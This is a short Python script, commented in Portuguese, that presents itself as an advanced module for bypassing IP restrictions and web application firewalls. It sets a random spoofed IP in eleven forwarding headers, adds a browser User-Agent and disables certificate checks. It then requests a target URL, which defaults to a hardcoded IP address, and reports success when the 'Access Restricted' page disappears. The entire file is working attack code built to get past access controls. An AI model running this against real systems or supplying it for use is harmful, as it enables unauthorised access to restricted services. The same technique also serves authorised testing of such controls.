import requests
import random

class AdvancedIPBypass:
    """
    Módulo avançado para bypass de restrições de IP e WAF.
    Implementa técnicas de injeção de headers comuns em fóruns russos e chineses.
    """
    
    COMMON_HEADERS = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Client-IP",
        "Forwarded-For",
        "X-Forwarded",
        "X-Cluster-Client-IP",
        "Client-IP",
        "True-Client-IP",
        "X-Originating-IP",
        "X-Host",
        "X-Custom-IP-Authorization"
    ]

    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def generate_random_ip(self):
        return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

    def get_bypass_headers(self):
        random_ip = self.generate_random_ip()
        headers = {header: random_ip for header in self.COMMON_HEADERS}
        # Adicionar headers de User-Agent realistas
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        return headers

    def test_bypass(self):
        print(f"[*] Testando bypass de IP para: {self.target_url}")
        headers = self.get_bypass_headers()
        try:
            # Desabilitar verificação SSL para IPs diretos
            response = self.session.get(self.target_url, headers=headers, timeout=10, verify=False)
            print(f"[+] Status Code: {response.status_code}")
            if "Access Restricted" not in response.text:
                print("[!] SUCESSO: Restrição de IP possivelmente contornada!")
                return True, headers
            else:
                print("[-] FALHA: Restrição de IP ainda ativa.")
                return False, None
        except Exception as e:
            print(f"[!] Erro ao testar bypass: {e}")
            return False, None

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "https://140.150.30.213:5001/"
    bypass = AdvancedIPBypass(target)
    bypass.test_bypass()
